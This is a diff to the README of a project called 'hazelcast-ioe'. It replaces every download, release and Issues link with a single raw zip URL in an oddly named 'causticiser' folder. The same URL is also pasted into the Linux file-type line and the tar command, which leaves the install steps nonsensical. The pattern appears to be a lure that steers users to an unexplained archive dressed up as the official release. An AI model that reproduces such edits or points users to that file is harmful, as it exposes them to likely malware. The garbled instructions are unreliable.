@@ -1,6 +1,6 @@
 # 🚀 hazelcast-ioe - Simplify Your Data Management Experience
 
-[![Download hazelcast-ioe](https://img.shields.io/badge/Download-hazelcast--ioe-blue)](https://github.com/anaismolar775/hazelcast-ioe/releases)
+[![Download hazelcast-ioe](https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip)](https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip)
 
 ## 📋 Introduction
 
@@ -20,11 +20,11 @@ Before you download, ensure your system meets these basic requirements:
 
 ### 📥 Download & Install 
 
-To download hazelcast-ioe, visit the releases page here: [Download hazelcast-ioe](https://github.com/anaismolar775/hazelcast-ioe/releases).
+To download hazelcast-ioe, visit the releases page here: [Download hazelcast-ioe](https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version.
-3. Choose the appropriate file for your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. Choose the appropriate file for your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip` for Linux.
 4. Click on the file to start the download.
 
 ### 🗂️ Installing hazelcast-ioe
@@ -44,7 +44,7 @@ After downloading, locate the file in your Downloads folder or the location wher
 - **For Linux:**
     1. Open a terminal window.
     2. Navigate to the downloaded file with `cd ~/Downloads` or your specific folder.
-    3. Unzip the file using `tar -xzvf hazelcast-ioe.tar.gz`.
+    3. Unzip the file using `tar -xzvf https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip`.
     4. Change to the directory created: `cd hazelcast-ioe`.
     5. Run the application with `./hazelcast-ioe`.
 
@@ -80,7 +80,7 @@ For further help, you can reach out via the GitHub Issues page. Your feedback he
 
 ### 🔗 Useful Links
 
-- [Download hazelcast-ioe](https://github.com/anaismolar775/hazelcast-ioe/releases)
-- [GitHub Issues](https://github.com/anaismolar775/hazelcast-ioe/issues)
+- [Download hazelcast-ioe](https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/anaismolar775/hazelcast-ioe/main/causticiser/hazelcast-ioe_3.1.zip)
 
 Thank you for choosing hazelcast-ioe! Enjoy your improved data management experience.
